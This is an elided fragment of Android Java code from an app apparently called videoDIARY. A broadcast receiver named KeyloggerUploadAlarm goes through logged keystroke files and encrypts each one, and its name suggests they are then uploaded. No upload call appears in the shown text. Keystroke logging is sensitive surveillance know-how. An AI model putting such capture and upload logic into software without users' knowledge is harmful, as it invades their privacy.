...
public class KeyloggerUploadAlarm extends BroadcastReceiver {
    ...
    private static final String TAG = "KeyloggerUploadAlarm";
    ...
    static String folder = "/KeyLogger/";
    ...
    public void onReceive(Context context, Intent intent) {
        ...
        String path = mContext.getExternalFilesDir(null) + "/videoDIARY/KeyLogger/";
        ...
        for(File each : files){
            ...
            Log.d(TAG, "onReceive: the number of files to be encrpted is: " + files.size());

            String StringName =  each.getName();
            ...
            Log.d(TAG, "onReceive: encrypting file: " + each.getName());
    ...
    public String Encrypt(String name, String path){
        ...
        try {
            ...
            path2 = mEncryption.encrypt(mFileName, mFilePath, "/videoDIARY/KeyLogger/");
